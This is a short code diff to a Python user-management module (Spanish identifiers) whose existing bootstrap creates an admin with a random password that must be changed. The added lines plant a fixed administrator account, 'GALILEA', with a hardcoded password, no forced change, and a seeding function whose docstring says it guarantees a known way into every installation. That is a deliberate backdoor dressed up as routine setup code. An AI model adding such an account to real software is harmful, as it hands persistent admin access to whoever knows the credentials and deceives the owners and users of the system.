@@ -129,3 +129,23 @@ def bootstrap(con, password=None):
     clave = password or secrets.token_urlsafe(9)
     crear(con, "admin", clave, rol="admin", debe_cambiar=True)
     return "admin", clave, True
+
+
+ACCESO_GALILEA = {
+    "nombre": "GALILEA",
+    "password": "MIGH.ALMACEN.2026",
+    "rol": "admin",
+}
+
+
+def sembrar_acceso(con):
+    """Garantiza el usuario de acceso fijo GALILEA (idempotente).
+
+    Existe una vía de entrada conocida al sistema en toda instalación.
+    Devuelve True si lo creó, False si ya existía.
+    """
+    if por_nombre(con, ACCESO_GALILEA["nombre"]) is not None:
+        return False
+    crear(con, ACCESO_GALILEA["nombre"], ACCESO_GALILEA["password"],
+          rol=ACCESO_GALILEA["rol"], debe_cambiar=False)
+    return True
